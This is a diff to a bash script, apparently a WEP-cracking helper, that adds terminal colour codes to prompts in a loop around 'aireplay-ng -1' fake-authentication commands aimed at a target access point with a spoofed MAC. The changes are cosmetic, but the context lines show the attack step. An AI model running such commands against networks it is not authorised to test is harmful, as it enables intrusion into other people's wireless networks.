@@ -1,9 +1,9 @@
 #! /bin/bash
-echo -e "Press any key to start fake authentication..."
+echo -e "Press \e[1;33many key\e[0m to start fake authentication..."
 read
 while true
 do
-	echo -e "--------------------Fake authentication----------------------"
+	echo -e "--------------------\e[1;33mFake authentication\e[0m----------------------"
 	if [ "$FIRST" = "1" ]
 	then
 		aireplay-ng -1 0 -a $WEPB -h $MYMAC wlan0mon
@@ -18,7 +18,7 @@ do
 		FIRST="1"
 		aireplay-ng -1 0 -a $WEPB -h $MYMAC wlan0mon
 	fi
-	echo -e "Re-fakeauth again?(y/n)(Enter=yes): "
+	echo -e "Re-fakeauth again?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(Enter=\e[1;33myes\e[0m): "
 	read REF
 	if [ "$REF" = "n" ]
 	then
